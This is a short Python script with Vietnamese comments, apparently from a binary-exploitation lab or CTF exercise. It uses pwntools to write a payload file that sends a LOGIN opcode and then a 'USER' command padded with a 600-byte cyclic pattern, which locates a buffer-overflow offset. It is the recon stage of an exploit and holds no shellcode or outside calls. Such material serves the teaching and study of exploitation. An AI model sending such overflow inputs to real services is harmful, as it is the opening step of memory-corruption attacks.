# Tạo một file script python nhỏ, ví dụ: create_payload.py
from pwn import *

# Tạo chuỗi pattern
# Lưu ý: Gef có thể dùng n=8, pwntools dùng n=4. Kết quả hơi khác
# nhưng không ảnh hưởng. Dùng của pwntools cho tiện.
pattern = cyclic(600) 

# Tạo nội dung cho file payload.txt
with open("payload.txt", "wb") as f:
    # Dòng 1: Gửi mã lệnh LOGIN (0)
    f.write(p32(0))
    
    # Dòng 2: Gửi payload USER + pattern
    # Thêm \n (newline) ở cuối để mô phỏng nhấn Enter
    f.write(b"USER " + pattern + b"\n")